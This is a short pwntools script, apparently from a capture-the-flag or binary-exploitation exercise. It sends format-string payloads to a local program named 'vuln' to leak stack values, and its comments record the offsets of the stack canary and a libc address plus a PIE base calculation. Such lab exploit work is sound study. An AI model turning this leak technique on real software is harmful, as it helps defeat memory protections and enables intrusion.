from pwn import *

elf = ELF("./vuln")

for i in range(50):
    p = elf.process(level="error")
    #pause()
    p.recvuntil(b": ")
    p.sendline(b"AAAA %%%d$lx" % i)
    p.recvline()
    print("%d - %s" % (i, p.recvline().strip()))
    p.close()

"""
canary is 15
libc is 17

this instruction puts the canary into RDX =>  0x5561ae6c7228 <main+127>    mov    rdx, qword ptr [rbp - 8]
"""

"""
for an example of pie leak we can compute the delta to find the base address

>>> hex(0x555e8070d1b6 - 0x555e8070c000)
'0x11b6'
"""